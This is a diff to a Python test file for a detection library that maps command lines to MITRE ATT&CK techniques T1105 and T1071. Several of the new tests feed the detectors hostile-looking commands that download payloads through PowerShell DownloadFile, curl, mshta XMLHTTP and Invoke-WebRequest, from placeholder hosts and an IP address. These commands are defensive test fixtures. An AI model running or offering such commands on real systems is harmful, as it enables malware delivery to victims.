@@ -22,7 +22,7 @@ from pathlib import Path
 src_root = Path(__file__).resolve().parent.parent / "src"
 sys.path.insert(0, str(src_root))
 
-from core.detector import score_confidence, detect_t1059, detect_t1218, detect_t1027
+from core.detector import score_confidence, detect_t1059, detect_t1218, detect_t1027, detect_t1105, detect_t1071
 
 
 def test_score_confidence_zero_evidence():
@@ -495,68 +495,122 @@ def test_detect_t1027_confidence_with_evidence():
         assert detection['confidence'] <= 1.0
 
 
-if __name__ == "__main__":
-    # Simple test runner
-    test_functions = [
-        # score_confidence tests (14)
-        test_score_confidence_zero_evidence,
-        test_score_confidence_single_evidence,
-        test_score_confidence_duplicate_evidence,
-        test_score_confidence_diverse_evidence,
-        test_score_confidence_max_clamping,
-        test_score_confidence_min_clamping,
-        test_score_confidence_generic_penalty,
-        test_score_confidence_chaining_bonus,
-        test_score_confidence_download_bonus,
-        test_score_confidence_realistic_mshta,
-        test_score_confidence_evidence_count_cap,
-        test_score_confidence_category_diversity_cap,
-        test_score_confidence_progression,
-        test_score_confidence_mixed_generic_non_generic,
-        # detect_t1059 tests (10)
-        test_detect_t1059_mshta_javascript,
-        test_detect_t1059_mshta_vbscript,
-        test_detect_t1059_cmd_execution,
-        test_detect_t1059_powershell,
-        test_detect_t1059_no_detections,
-        test_detect_t1059_evidence_extraction,
-        test_detect_t1059_confidence_increases_with_evidence,
-        test_detect_t1059_output_structure,
-        test_detect_t1059_mshta_suppression,
-        test_detect_t1059_indirect_cmd_execution,
-        # detect_t1218 tests (9)
-        test_detect_t1218_mshta_proxy,
-        test_detect_t1218_mshta_activex,
-        test_detect_t1218_rundll32,
-        test_detect_t1218_evidence_extraction,
-        test_detect_t1218_no_detections,
-        test_detect_t1218_output_structure,
-        test_detect_t1218_mshta_network,
-        test_detect_t1218_multiple_patterns,
-        # detect_t1027 tests (7)
-        test_detect_t1027_packing_tools,
-        test_detect_t1027_steganography,
-        test_detect_t1027_string_concat,
-        test_detect_t1027_no_detections,
-        test_detect_t1027_evidence_extraction,
-        test_detect_t1027_output_structure,
-        test_detect_t1027_confidence_with_evidence,
-    ]
-    
-    passed = 0
-    failed = 0
-    
-    for test in test_functions:
-        try:
-            test()
-            print(f"✓ {test.__name__}")
-            passed += 1
-        except AssertionError as e:
-            print(f"✗ {test.__name__}: {e}")
-            failed += 1
-        except Exception as e:
-            print(f"✗ {test.__name__}: Unexpected error: {e}")
-            failed += 1
-    
-    print(f"\n{passed} passed, {failed} failed")
-    sys.exit(0 if failed == 0 else 1)
+# ===== detect_t1105 Tests =====
+
+def test_detect_t1105_powershell_downloadfile():
+    """Test T1105 detection for PowerShell DownloadFile usage."""
+    cmd = "powershell -c (New-Object Net.WebClient).DownloadFile('http://example.com/payload.exe','C:\\temp\\payload.exe')"
+    detections = detect_t1105(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1105' for d in detections)
+
+
+def test_detect_t1105_curl_download_output():
+    """Test T1105 detection for curl download with output file flag."""
+    cmd = "curl -o payload.exe http://example.com/payload.exe"
+    detections = detect_t1105(cmd)
+
+    assert len(detections) > 0
+    detection = detections[0]
+    assert detection['technique_id'] == 'T1105'
+
+
+def test_detect_t1105_xmlhttp_remote_fetch():
+    """Test T1105 detection for XMLHTTP remote fetch via mshta JavaScript."""
+    cmd = "mshta.exe javascript:var xhr=new ActiveXObject('MSXML2.XMLHTTP');xhr.open('GET','http://example.com/stage.js',0);xhr.send();"
+    detections = detect_t1105(cmd)
+
+    assert len(detections) > 0
+    assert any('XMLHTTP' in str(ev) for d in detections for ev in d.get('evidence', []))
+
+
+def test_detect_t1105_no_detections_for_benign_command():
+    """Test T1105 returns no findings for benign local command."""
+    cmd = "notepad.exe"
+    detections = detect_t1105(cmd)
+
+    assert len(detections) == 0
+
+
+def test_detect_t1105_output_structure():
+    """Test T1105 detection output schema consistency."""
+    cmd = "curl -o payload.exe http://example.com/payload.exe"
+    detections = detect_t1105(cmd)
+
+    assert len(detections) > 0
+    detection = detections[0]
+    assert detection['technique_id'] == 'T1105'
+    assert 'technique' in detection
+    assert 'tactic' in detection
+    assert 'behavior' in detection
+    assert 'attacker_intent' in detection
+    assert 'confidence' in detection
+    assert 'evidence' in detection
+    assert 'defensive_enrichment' in detection
+
+
+# ===== detect_t1071 Tests =====
+
+def test_detect_t1071_http_url_in_command():
+    """Test T1071.001 detection when HTTP URL appears in command line."""
+    cmd = "curl http://example.com/payload"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1071' for d in detections)
+    assert any(d['subtechnique_id'] == 'T1071.001' for d in detections)
+
+
+def test_detect_t1071_invoke_webrequest():
+    """Test T1071 detection for PowerShell Invoke-WebRequest usage."""
+    cmd = "powershell -c Invoke-WebRequest -Uri http://example.com/payload -OutFile payload.exe"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1071' for d in detections)
+
+
+def test_detect_t1071_suspicious_tld_url():
+    """Test T1071 detection for suspicious TLD URL patterns."""
+    cmd = "powershell -c iwr http://cdn-update.xyz/dropper"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1071' for d in detections)
+
+
+def test_detect_t1071_ip_address_url():
+    """Test T1071 detection for direct IP address URL usage."""
+    cmd = "curl http://10.10.10.10:8080/stage"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) > 0
+    assert any(d['technique_id'] == 'T1071' for d in detections)
+
+
+def test_detect_t1071_no_detections_for_benign_command():
+    """Test T1071 returns no findings for command without application-layer network indicators."""
+    cmd = "cmd.exe /c dir"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) == 0
+
+
+def test_detect_t1071_output_structure():
+    """Test T1071 detection output schema consistency."""
+    cmd = "powershell -c Invoke-RestMethod -Uri http://example.com/api"
+    detections = detect_t1071(cmd)
+
+    assert len(detections) > 0
+    detection = detections[0]
+    assert detection['technique_id'] == 'T1071'
+    assert 'technique' in detection
+    assert 'subtechnique_id' in detection
+    assert 'subtechnique' in detection
+    assert 'tactic' in detection
+    assert 'behavior' in detection
+    assert 'attacker_intent' in detection
+    assert 'confidence' in detection
+    assert 'evidence' in detection
+    assert 'defensive_enrichment' in detection
